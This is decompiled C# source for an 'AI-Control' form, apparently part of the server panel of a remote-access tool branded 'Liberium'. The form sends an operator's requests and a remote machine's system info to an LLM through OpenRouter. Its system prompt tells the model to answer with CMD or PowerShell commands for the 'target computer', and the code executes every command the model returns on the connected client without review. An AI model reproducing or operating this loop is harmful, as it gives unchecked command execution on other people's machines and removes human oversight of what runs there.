using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using CustomControls.RJControls;
using MaterialSkin;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using Server.Connectings;
using Server.Helper;

namespace Server.Forms;

public class FormAiControl : FormMaterial
{
	private class ChatMessage
	{
		public string Role { get; set; }

		public string Content { get; set; }
	}

	public Clients client;

	public Clients parrent;

	private string systemInfo = "";

	private List<ChatMessage> chatHistory = new List<ChatMessage>();

	private bool isConnected;

	private static readonly HttpClient httpClient;

	private string apiKey = "";

	private string modelId = "deepseek/deepseek-v4-flash:free";

	private const string SYSTEM_PROMPT = "You are an AI assistant that helps control a remote Windows computer. \r\nWhen the user asks you to do something on the computer, you must respond with executable commands.\r\nYour response format must be:\r\n- If you need to execute a CMD command, respond with: [CMD]command here[/CMD]\r\n- If you need to execute a PowerShell command, respond with: [PS]command here[/PS]\r\n- You can include multiple commands in one response.\r\n- Always explain what you're doing before the commands.\r\n- If the user asks something that doesn't require a command, just respond normally.\r\n- Respond in the same language the user writes to you.\r\n\r\nSystem information about the target computer:\r\n{SYSINFO}";

	private IContainer components;

	public RichTextBox rtbChat;

	private Panel panelInput;

	private RJButton btnSend;

	public RJTextBox rjTextBoxInput;

	private RJTextBox rjTextBoxApiKey;

	private RJComboBox rjComboBoxModel;

	private RJButton btnSaveSettings;

	private RJButton btnGetInfo;

	private Label lblStatus;

	static FormAiControl()
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0014: Expected O, but got Unknown
		ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
		httpClient = new HttpClient();
		httpClient.Timeout = TimeSpan.FromSeconds(60.0);
	}

	public FormAiControl()
	{
		InitializeComponent();
		BackColor = Color.White;
		base.FormClosing += FormAiControl_FormClosing;
		base.Load += FormAiControl_Load;
	}

	private void FormAiControl_Load(object sender, EventArgs e)
	{
		MaterialSkinManager.Instance.ThemeChanged += ChangeScheme;
		ChangeScheme(this);
		rjTextBoxInput.textBox1.KeyDown += txtInput_KeyDown;
		try
		{
			if (File.Exists("local\\ai_settings.json"))
			{
				JObject settings = JObject.Parse(File.ReadAllText("local\\ai_settings.json"));
				apiKey = settings["api_key"]?.ToString() ?? "";
				modelId = settings["model"]?.ToString() ?? modelId;
				rjTextBoxApiKey.Texts = apiKey;
				rjComboBoxModel.Texts = modelId;
			}
		}
		catch
		{
		}
	}

	private void ChangeScheme(object sender)
	{
		bool num = MaterialSkinManager.Instance.Theme == MaterialSkinManager.Themes.DARK;
		Color back = (num ? Color.FromArgb(30, 30, 30) : Color.White);
		Color fore = (num ? Color.White : Color.Black);
		Color primary = FormMaterial.PrimaryColor;
		BackColor = back;
		rtbChat.BackColor = back;
		rtbChat.ForeColor = fore;
		panelInput.BackColor = back;
		btnSend.BackColor = primary;
		btnSend.BackgroundColor = primary;
		btnSaveSettings.BackColor = primary;
		btnSaveSettings.BackgroundColor = primary;
		btnGetInfo.BackColor = primary;
		btnGetInfo.BackgroundColor = primary;
		rjTextBoxInput.BorderColor = primary;
		rjTextBoxInput.BorderFocusColor = primary;
		rjTextBoxApiKey.BorderColor = primary;
		rjTextBoxApiKey.BorderFocusColor = primary;
		rjComboBoxModel.BorderColor = primary;
		rjComboBoxModel.IconColor = primary;
		Color textBack = (num ? Color.FromArgb(50, 50, 50) : Color.White);
		Color textFore = (num ? Color.WhiteSmoke : Color.FromArgb(64, 64, 64));
		rjTextBoxInput.BackColor = textBack;
		rjTextBoxInput.ForeColor = textFore;
		rjTextBoxApiKey.BackColor = textBack;
		rjTextBoxApiKey.ForeColor = textFore;
		rjComboBoxModel.BackColor = textBack;
		rjComboBoxModel.ForeColor = textFore;
		rjComboBoxModel.ListBackColor = textBack;
		rjComboBoxModel.ListTextColor = textFore;
	}

	public void SetConnected(bool connected)
	{
		isConnected = connected;
		rjTextBoxInput.Enabled = connected;
		btnSend.Enabled = connected;
		lblStatus.Text = (connected ? "Status: Connected" : "Status: Disconnected");
		lblStatus.ForeColor = (connected ? Color.Green : Color.Red);
	}

	public void AppendMessage(string sender, string message)
	{
		string time = DateTime.Now.ToString("HH:mm:ss");
		string formatted = "[" + time + "] " + sender + ": " + message + "\r\n";
		rtbChat.SelectionStart = rtbChat.TextLength;
		rtbChat.SelectionLength = 0;
		switch (sender)
		{
		case "You":
			rtbChat.SelectionColor = Color.FromArgb(0, 150, 255);
			break;
		case "AI":
			rtbChat.SelectionColor = Color.FromArgb(0, 200, 100);
			break;
		case "System":
			rtbChat.SelectionColor = Color.Gray;
			break;
		case "Error":
			rtbChat.SelectionColor = Color.Red;
			break;
		case "Command":
			rtbChat.SelectionColor = Color.Orange;
			break;
		}
		rtbChat.AppendText(formatted);
		rtbChat.ScrollToCaret();
	}

	public void OnCommandResult(string command, string result, int exitCode)
	{
		AppendMessage("Command", $"[Exit: {exitCode}] {command}");
		if (!string.IsNullOrWhiteSpace(result))
		{
			AppendMessage("System", result);
		}
		chatHistory.Add(new ChatMessage
		{
			Role = "user",
			Content = $"[Command executed: {command}]\n[Exit code: {exitCode}]\n[Output: {result}]"
		});
	}

	public void OnSystemInfo(string info)
	{
		systemInfo = info;
		AppendMessage("System", "System info received.");
	}

	private async void btnSend_Click(object sender, EventArgs e)
	{
		await SendMessage();
	}

	private async void txtInput_KeyDown(object sender, KeyEventArgs e)
	{
		if (e.KeyCode == Keys.Return && !e.Shift)
		{
			e.SuppressKeyPress = true;
			await SendMessage();
		}
	}

	private async Task SendMessage()
	{
		string userMessage = rjTextBoxInput.Texts.Trim();
		if (string.IsNullOrEmpty(userMessage))
		{
			return;
		}
		apiKey = rjTextBoxApiKey.Texts.Trim().Replace("\r", "").Replace("\n", "")
			.Replace(" ", "");
		modelId = rjComboBoxModel.Texts.Trim().Replace("\r", "").Replace("\n", "")
			.Replace(" ", "");
		if (string.IsNullOrEmpty(apiKey))
		{
			AppendMessage("Error", "API Key not set! Enter your OpenRouter API key in Settings.");
			return;
		}
		rjTextBoxInput.Texts = "";
		AppendMessage("You", userMessage);
		chatHistory.Add(new ChatMessage
		{
			Role = "user",
			Content = userMessage
		});
		btnSend.Enabled = false;
		rjTextBoxInput.Enabled = false;
		try
		{
			string aiResponse = await CallAI(userMessage);
			AppendMessage("AI", aiResponse);
			chatHistory.Add(new ChatMessage
			{
				Role = "assistant",
				Content = aiResponse
			});
			ParseAndExecuteCommands(aiResponse);
		}
		catch (WebException ex)
		{
			if (ex.Response != null)
			{
				using (StreamReader reader = new StreamReader(ex.Response.GetResponseStream()))
				{
					AppendMessage("Error", "API error: " + reader.ReadToEnd());
					return;
				}
			}
			AppendMessage("Error", "Network error: " + ex.Message);
		}
		catch (TaskCanceledException)
		{
			AppendMessage("Error", "Request timed out. Try again.");
		}
		catch (Exception ex3)
		{
			AppendMessage("Error", "Error: " + ex3.Message);
		}
		finally
		{
			btnSend.Enabled = isConnected;
			rjTextBoxInput.Enabled = isConnected;
			rjTextBoxInput.Focus();
		}
	}

	private async Task<string> CallAI(string userMessage)
	{
		string systemPrompt = "You are an AI assistant that helps control a remote Windows computer. \r\nWhen the user asks you to do something on the computer, you must respond with executable commands.\r\nYour response format must be:\r\n- If you need to execute a CMD command, respond with: [CMD]command here[/CMD]\r\n- If you need to execute a PowerShell command, respond with: [PS]command here[/PS]\r\n- You can include multiple commands in one response.\r\n- Always explain what you're doing before the commands.\r\n- If the user asks something that doesn't require a command, just respond normally.\r\n- Respond in the same language the user writes to you.\r\n\r\nSystem information about the target computer:\r\n{SYSINFO}".Replace("{SYSINFO}", systemInfo);
		List<object> messages = new List<object>();
		messages.Add(new
		{
			role = "system",
			content = systemPrompt
		});
		for (int i = Math.Max(0, chatHistory.Count - 10); i < chatHistory.Count; i++)
		{
			ChatMessage msg = chatHistory[i];
			messages.Add(new
			{
				role = msg.Role,
				content = msg.Content
			});
		}
		var requestBody = new
		{
			model = modelId,
			messages = messages,
			max_tokens = 1024,
			temperature = 0.7
		};
		string json = JsonConvert.SerializeObject(requestBody);
		string url = "https://openrouter.ai/api/v1/chat/completions";
		return await Task.Run(delegate
		{
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(url);
			httpWebRequest.Method = "POST";
			httpWebRequest.ContentType = "application/json";
			httpWebRequest.Timeout = 60000;
			httpWebRequest.Headers.Add("Authorization", "Bearer " + apiKey);
			httpWebRequest.Headers.Add("HTTP-Referer", "https://liberium.app");
			httpWebRequest.Headers.Add("X-Title", "Liberium AI-Control");
			byte[] bytes = Encoding.UTF8.GetBytes(json);
			httpWebRequest.ContentLength = bytes.Length;
			using (Stream stream = httpWebRequest.GetRequestStream())
			{
				stream.Write(bytes, 0, bytes.Length);
			}
			using HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
			using StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream(), Encoding.UTF8);
			return (JObject.Parse(streamReader.ReadToEnd())["choices"]?[0]?["message"]?["content"]?.ToString() ?? "").Trim();
		});
	}

	private void ParseAndExecuteCommands(string aiResponse)
	{
		if (client == null || !isConnected)
		{
			return;
		}
		string targetHwid = client.Hwid;
		if (string.IsNullOrEmpty(targetHwid))
		{
			AppendMessage("Error", "Cannot execute: client HWID is not set");
			return;
		}
		int cmdStart = 0;
		while ((cmdStart = aiResponse.IndexOf("[CMD]", cmdStart, StringComparison.OrdinalIgnoreCase)) != -1)
		{
			int cmdEnd = aiResponse.IndexOf("[/CMD]", cmdStart, StringComparison.OrdinalIgnoreCase);
			if (cmdEnd == -1)
			{
				break;
			}
			string command = aiResponse.Substring(cmdStart + 5, cmdEnd - cmdStart - 5).Trim();
			if (!string.IsNullOrEmpty(command))
			{
				AppendMessage("System", "Executing CMD: " + command);
				client.Send(new object[3] { targetHwid, "Execute", command });
			}
			cmdStart = cmdEnd + 6;
		}
		int psStart = 0;
		while ((psStart = aiResponse.IndexOf("[PS]", psStart, StringComparison.OrdinalIgnoreCase)) != -1)
		{
			int psEnd = aiResponse.IndexOf("[/PS]", psStart, StringComparison.OrdinalIgnoreCase);
			if (psEnd != -1)
			{
				string command2 = aiResponse.Substring(psStart + 4, psEnd - psStart - 4).Trim();
				if (!string.IsNullOrEmpty(command2))
				{
					AppendMessage("System", "Executing PowerShell: " + command2);
					client.Send(new object[3] { targetHwid, "ExecutePowerShell", command2 });
				}
				psStart = psEnd + 5;
				continue;
			}
			break;
		}
	}

	private void btnSaveSettings_Click(object sender, EventArgs e)
	{
		apiKey = rjTextBoxApiKey.Texts.Trim().Replace("\r", "").Replace("\n", "");
		modelId = rjComboBoxModel.Texts.Trim().Replace("\r", "").Replace("\n", "");
		if (string.IsNullOrEmpty(modelId))
		{
			modelId = "deepseek/deepseek-v4-flash:free";
			rjComboBoxModel.Texts = modelId;
		}
		try
		{
			JObject settings = new JObject
			{
				["api_key"] = apiKey,
				["model"] = modelId
			};
			Directory.CreateDirectory("local");
			File.WriteAllText("local\\ai_settings.json", settings.ToString());
			AppendMessage("System", "Settings saved. Model: " + modelId);
		}
		catch (Exception ex)
		{
			AppendMessage("Error", "Failed to save settings: " + ex.Message);
		}
	}

	private void btnGetInfo_Click(object sender, EventArgs e)
	{
		if (client != null && isConnected)
		{
			string targetHwid = client.Hwid;
			if (string.IsNullOrEmpty(targetHwid))
			{
				AppendMessage("Error", "Cannot request info: client HWID is not set");
				return;
			}
			client.Send(new object[2] { targetHwid, "GetSystemInfo" });
			AppendMessage("System", "Requesting system info...");
		}
	}

	private void FormAiControl_FormClosing(object sender, FormClosingEventArgs e)
	{
		if (client != null)
		{
			client.Disconnect();
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		this.rtbChat = new System.Windows.Forms.RichTextBox();
		this.panelInput = new System.Windows.Forms.Panel();
		this.rjTextBoxInput = new CustomControls.RJControls.RJTextBox();
		this.btnSend = new CustomControls.RJControls.RJButton();
		this.rjTextBoxApiKey = new CustomControls.RJControls.RJTextBox();
		this.rjComboBoxModel = new CustomControls.RJControls.RJComboBox();
		this.btnSaveSettings = new CustomControls.RJControls.RJButton();
		this.btnGetInfo = new CustomControls.RJControls.RJButton();
		this.lblStatus = new System.Windows.Forms.Label();
		this.panelInput.SuspendLayout();
		base.SuspendLayout();
		this.rtbChat.BackColor = System.Drawing.Color.White;
		this.rtbChat.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.rtbChat.Dock = System.Windows.Forms.DockStyle.Fill;
		this.rtbChat.Font = new System.Drawing.Font("Consolas", 9.75f);
		this.rtbChat.ForeColor = System.Drawing.Color.Black;
		this.rtbChat.Location = new System.Drawing.Point(3, 64);
		this.rtbChat.Name = "rtbChat";
		this.rtbChat.ReadOnly = true;
		this.rtbChat.Size = new System.Drawing.Size(889, 435);
		this.rtbChat.TabIndex = 0;
		this.rtbChat.Text = "";
		this.panelInput.BackColor = System.Drawing.Color.White;
		this.panelInput.Controls.Add(this.rjTextBoxInput);
		this.panelInput.Controls.Add(this.btnSend);
		this.panelInput.Controls.Add(this.rjTextBoxApiKey);
		this.panelInput.Controls.Add(this.rjComboBoxModel);
		this.panelInput.Controls.Add(this.btnSaveSettings);
		this.panelInput.Controls.Add(this.btnGetInfo);
		this.panelInput.Controls.Add(this.lblStatus);
		this.panelInput.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.panelInput.Location = new System.Drawing.Point(3, 499);
		this.panelInput.Name = "panelInput";
		this.panelInput.Size = new System.Drawing.Size(889, 106);
		this.panelInput.TabIndex = 1;
		this.rjTextBoxInput.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
		this.rjTextBoxInput.BackColor = System.Drawing.Color.White;
		this.rjTextBoxInput.BorderColor = System.Drawing.Color.FromArgb(0, 150, 136);
		this.rjTextBoxInput.BorderFocusColor = System.Drawing.Color.HotPink;
		this.rjTextBoxInput.BorderRadius = 0;
		this.rjTextBoxInput.BorderSize = 1;
		this.rjTextBoxInput.Font = new System.Drawing.Font("Segoe UI", 10f);
		this.rjTextBoxInput.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
		this.rjTextBoxInput.Location = new System.Drawing.Point(9, 25);
		this.rjTextBoxInput.Margin = new System.Windows.Forms.Padding(4);
		this.rjTextBoxInput.Multiline = false;
		this.rjTextBoxInput.Name = "rjTextBoxInput";
		this.rjTextBoxInput.Padding = new System.Windows.Forms.Padding(10, 7, 10, 7);
		this.rjTextBoxInput.PasswordChar = false;
		this.rjTextBoxInput.PlaceholderColor = System.Drawing.Color.DarkGray;
		this.rjTextBoxInput.PlaceholderText = "Enter message...";
		this.rjTextBoxInput.Size = new System.Drawing.Size(695, 34);
		this.rjTextBoxInput.TabIndex = 0;
		this.rjTextBoxInput.Texts = "";
		this.rjTextBoxInput.UnderlinedStyle = false;
		this.btnSend.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
		this.btnSend.BackColor = System.Drawing.Color.FromArgb(0, 150, 136);
		this.btnSend.BackgroundColor = System.Drawing.Color.FromArgb(0, 150, 136);
		this.btnSend.BorderColor = System.Drawing.Color.PaleVioletRed;
		this.btnSend.BorderRadius = 0;
		this.btnSend.BorderSize = 0;
		this.btnSend.FlatAppearance.BorderSize = 0;
		this.btnSend.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.btnSend.Font = new System.Drawing.Font("Arial", 9.5f, System.Drawing.FontStyle.Bold);
		this.btnSend.ForeColor = System.Drawing.Color.White;
		this.btnSend.Location = new System.Drawing.Point(711, 25);
		this.btnSend.Name = "btnSend";
		this.btnSend.Size = new System.Drawing.Size(171, 33);
		this.btnSend.TabIndex = 1;
		this.btnSend.Text = "Send";
		this.btnSend.TextColor = System.Drawing.Color.White;
		this.btnSend.UseVisualStyleBackColor = false;
		this.btnSend.Click += new System.EventHandler(btnSend_Click);
		this.rjTextBoxApiKey.BackColor = System.Drawing.Color.White;
		this.rjTextBoxApiKey.BorderColor = System.Drawing.Color.FromArgb(0, 150, 136);
		this.rjTextBoxApiKey.BorderFocusColor = System.Drawing.Color.HotPink;
		this.rjTextBoxApiKey.BorderRadius = 0;
		this.rjTextBoxApiKey.BorderSize = 1;
		this.rjTextBoxApiKey.Font = new System.Drawing.Font("Segoe UI", 9f);
		this.rjTextBoxApiKey.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
		this.rjTextBoxApiKey.Location = new System.Drawing.Point(9, 66);
		this.rjTextBoxApiKey.Margin = new System.Windows.Forms.Padding(4);
		this.rjTextBoxApiKey.Multiline = false;
		this.rjTextBoxApiKey.Name = "rjTextBoxApiKey";
		this.rjTextBoxApiKey.Padding = new System.Windows.Forms.Padding(7, 5, 7, 5);
		this.rjTextBoxApiKey.PasswordChar = true;
		this.rjTextBoxApiKey.PlaceholderColor = System.Drawing.Color.DarkGray;
		this.rjTextBoxApiKey.PlaceholderText = "sk-or-v1-...";
		this.rjTextBoxApiKey.Size = new System.Drawing.Size(280, 26);
		this.rjTextBoxApiKey.TabIndex = 2;
		this.rjTextBoxApiKey.Texts = "";
		this.rjTextBoxApiKey.UnderlinedStyle = false;
		this.rjComboBoxModel.BackColor = System.Drawing.Color.White;
		this.rjComboBoxModel.BorderColor = System.Drawing.Color.FromArgb(0, 150, 136);
		this.rjComboBoxModel.BorderSize = 1;
		this.rjComboBoxModel.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDown;
		this.rjComboBoxModel.Font = new System.Drawing.Font("Segoe UI", 8.5f);
		this.rjComboBoxModel.ForeColor = System.Drawing.Color.DimGray;
		this.rjComboBoxModel.IconColor = System.Drawing.Color.FromArgb(0, 150, 136);
		this.rjComboBoxModel.Items.AddRange(new object[10] { "deepseek/deepseek-v4-flash:free", "nvidia/nemotron-3-super-120b-a12b:free", "google/gemma-4-31b-it:free", "openai/gpt-oss-120b:free", "openai/gpt-oss-20b:free", "nvidia/nemotron-nano-9b-v2:free", "arcee-ai/trinity-large-thinking:free", "minimax/minimax-m2.5:free", "z-ai/glm-4.5-air:free", "poolside/laguna-m.1:free" });
		this.rjComboBoxModel.ListBackColor = System.Drawing.Color.White;
		this.rjComboBoxModel.ListTextColor = System.Drawing.Color.DimGray;
		this.rjComboBoxModel.Location = new System.Drawing.Point(294, 66);
		this.rjComboBoxModel.MinimumSize = new System.Drawing.Size(200, 30);
		this.rjComboBoxModel.Name = "rjComboBoxModel";
		this.rjComboBoxModel.Padding = new System.Windows.Forms.Padding(1);
		this.rjComboBoxModel.Size = new System.Drawing.Size(280, 30);
		this.rjComboBoxModel.TabIndex = 3;
		this.rjComboBoxModel.Texts = "deepseek/deepseek-v4-flash:free";
		this.btnSaveSettings.BackColor = System.Drawing.Color.FromArgb(0, 150, 136);
		this.btnSaveSettings.BackgroundColor = System.Drawing.Color.FromArgb(0, 150, 136);
		this.btnSaveSettings.BorderColor = System.Drawing.Color.PaleVioletRed;
		this.btnSaveSettings.BorderRadius = 0;
		this.btnSaveSettings.BorderSize = 0;
		this.btnSaveSettings.FlatAppearance.BorderSize = 0;
		this.btnSaveSettings.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.btnSaveSettings.Font = new System.Drawing.Font("Arial", 9f, System.Drawing.FontStyle.Bold);
		this.btnSaveSettings.ForeColor = System.Drawing.Color.White;
		this.btnSaveSettings.Location = new System.Drawing.Point(579, 66);
		this.btnSaveSettings.Name = "btnSaveSettings";
		this.btnSaveSettings.Size = new System.Drawing.Size(130, 30);
		this.btnSaveSettings.TabIndex = 4;
		this.btnSaveSettings.Text = "Save Settings";
		this.btnSaveSettings.TextColor = System.Drawing.Color.White;
		this.btnSaveSettings.UseVisualStyleBackColor = false;
		this.btnSaveSettings.Click += new System.EventHandler(btnSaveSettings_Click);
		this.btnGetInfo.BackColor = System.Drawing.Color.FromArgb(0, 150, 136);
		this.btnGetInfo.BackgroundColor = System.Drawing.Color.FromArgb(0, 150, 136);
		this.btnGetInfo.BorderColor = System.Drawing.Color.PaleVioletRed;
		this.btnGetInfo.BorderRadius = 0;
		this.btnGetInfo.BorderSize = 0;
		this.btnGetInfo.FlatAppearance.BorderSize = 0;
		this.btnGetInfo.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.btnGetInfo.Font = new System.Drawing.Font("Arial", 9f, System.Drawing.FontStyle.Bold);
		this.btnGetInfo.ForeColor = System.Drawing.Color.White;
		this.btnGetInfo.Location = new System.Drawing.Point(715, 66);
		this.btnGetInfo.Name = "btnGetInfo";
		this.btnGetInfo.Size = new System.Drawing.Size(167, 30);
		this.btnGetInfo.TabIndex = 5;
		this.btnGetInfo.Text = "Get System Info";
		this.btnGetInfo.TextColor = System.Drawing.Color.White;
		this.btnGetInfo.UseVisualStyleBackColor = false;
		this.btnGetInfo.Click += new System.EventHandler(btnGetInfo_Click);
		this.lblStatus.AutoSize = true;
		this.lblStatus.Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Bold);
		this.lblStatus.ForeColor = System.Drawing.Color.Red;
		this.lblStatus.Location = new System.Drawing.Point(6, 6);
		this.lblStatus.Name = "lblStatus";
		this.lblStatus.Size = new System.Drawing.Size(124, 15);
		this.lblStatus.TabIndex = 6;
		this.lblStatus.Text = "Status: Disconnected";
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.Color.White;
		base.ClientSize = new System.Drawing.Size(895, 608);
		base.Controls.Add(this.rtbChat);
		base.Controls.Add(this.panelInput);
		base.Name = "FormAiControl";
		this.Text = "AI-Control";
		this.panelInput.ResumeLayout(false);
		this.panelInput.PerformLayout();
		base.ResumeLayout(false);
	}
}
